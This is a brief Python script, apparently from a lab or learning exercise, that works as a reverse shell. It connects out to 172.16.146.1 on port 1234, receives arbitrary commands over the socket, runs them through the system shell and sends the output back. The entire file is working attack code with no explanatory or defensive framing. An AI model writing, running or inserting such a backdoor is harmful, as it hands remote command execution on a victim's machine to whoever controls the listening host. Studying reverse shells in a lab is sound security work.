#!/usr/bin/python3

import socket
import subprocess

def shell():
	
	global sock	

	while True:
		cmd = sock.recv(1024)
		cmd = cmd.decode('utf-8')

		if cmd == "exit":
			break
		else:
			proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

			result = proc.stdout.read() + proc.stderr.read()
			sock.send(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(("172.16.146.1",1234))

def func():
	shell()
	sock.close()

if __name__ == '__main__': 

	func()

 
